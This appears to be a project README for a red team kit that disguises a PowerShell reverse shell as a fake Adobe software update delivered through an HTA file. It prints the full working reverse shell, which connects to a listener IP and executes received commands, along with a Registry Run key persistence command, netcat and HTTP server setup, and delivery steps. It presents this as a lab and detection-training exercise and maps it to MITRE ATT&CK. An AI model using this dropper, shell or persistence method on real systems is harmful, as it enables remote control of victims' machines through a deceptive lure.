# 🧨 AdobeUpdater-RedTeamSimulation

A red team simulation that mimics an Adobe software update to deliver a PowerShell reverse shell with stealth and persistence. Designed to emulate realistic attacker behavior and test detection capabilities in a Windows environment.

---

## 🚀 Overview

This simulation uses a **fake Adobe Updater UI** (`.hta`) that deploys:

- **PowerShell reverse shell** to a remote Netcat listener
- **Registry Run key persistence**
- **Stealthy VBScript execution**
- **Decoy visuals** to enhance realism
- **Base64 encoding and realistic icon spoofing**

It is intended for ethical red team demonstrations, SOC analyst training, and detection engineering labs.

---

## 📁 Project Structure
.
├── payload/
│ ├── AdobeUpdater.hta # Main dropper with embedded VBScript and UI
│ ├── adobe.ico # Spoofed Adobe icon
│ ├── adb1.png # Loading or decoy image
│ └── .gitkeep
├── analysis/
│ ├── report/
│ │ ├── screenshots/ # Screenshot evidence of execution
│ │ │ └── video/ # (Optional) video demonstration
│ │ └── AdobeUpdaterReport.pdf
└── README.md

---

## ⚙️ How It Works

1. **User executes the `.hta` payload** mimicking a legitimate Adobe updater.
2. The payload runs an **embedded VBScript**, which:
    - Launches a **PowerShell reverse shell** to a Kali Netcat listener
    - Adds a **Run registry key** for persistence
    - Displays a **fake update window** to distract the user

3. Reverse shell is caught by the attacker's Netcat listener.

---

## 💻 PowerShell Reverse Shell

``powershell
$client = New-Object System.Net.Sockets.TCPClient("192.168.78.129",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2  = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()

📥 Persistence via Registry
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "AdobeTaskHelper" `
  -Value "wscript.exe \"C:\Users\IEUser\Documents\AdobeTaskHelper.vbs\""

🎯 MITRE ATT&CK Mapping

| Technique         | ID        | Description              |
|-------------------|-----------|--------------------------|
| Initial Access    | T1204.002 | User Execution via HTA   |
| Execution         | T1059.001 | PowerShell               |
| Persistence       | T1547.001 | Registry Run Key         |
| Defense Evasion   | T1218.005 | LOLBAS via `wscript.exe` |
| Command & Control | T1071.001 | Reverse Shell over TCP   |

---------------------------------------------------------------------------
🎥 Screenshots
Screenshots are included under analysis/report/screenshots/ and demonstrate:

Initial payload execution

Reverse shell connection

Registry key creation

Persistence confirmation

----------------------------------
🛠️ Setup Instructions
1. Start a Netcat listener on Kali:
   
nc -lvnp 4444

2. Serve the payload using a simple Python server:
cd payload/
python3 -m http.server 8888

3. On the target Windows machine:

Browse to the hosted .hta file

Execute it to trigger the payload

📓 Notes
Tested on Windows 10 with default security settings

Avoid running this on your production system

Always operate inside a safe, isolated lab environment

⚠️ Disclaimer
This project is for educational and ethical red teaming purposes only. Do not deploy on unauthorized systems. The author is not responsible for misuse or any consequences that result from improper use.
